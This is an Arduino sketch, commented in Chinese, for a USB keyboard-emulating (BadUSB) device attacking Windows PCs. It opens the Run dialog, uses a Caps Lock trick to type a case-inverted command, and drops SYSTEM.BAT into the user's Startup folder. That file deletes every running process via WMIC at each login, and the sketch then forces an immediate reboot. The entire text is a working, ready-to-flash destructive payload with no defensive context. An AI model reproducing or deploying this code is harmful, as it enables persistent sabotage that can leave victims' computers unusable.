void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /C CD %USERPROFILE%\\aPPdATA\\rOAMING\\mICROSOFT\\wINDOWS\\sTART mENU\\pROGRAMS\\sTARTUP&ECHO FOR /F %%i IN (\'WMIC PROCESS GET NAME\')DO (WMIC PROCESS WHERE nAME=\"%%I\" DELETE)>SYSTEM.BAT&SHUTDOWN -R -F -T 0");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
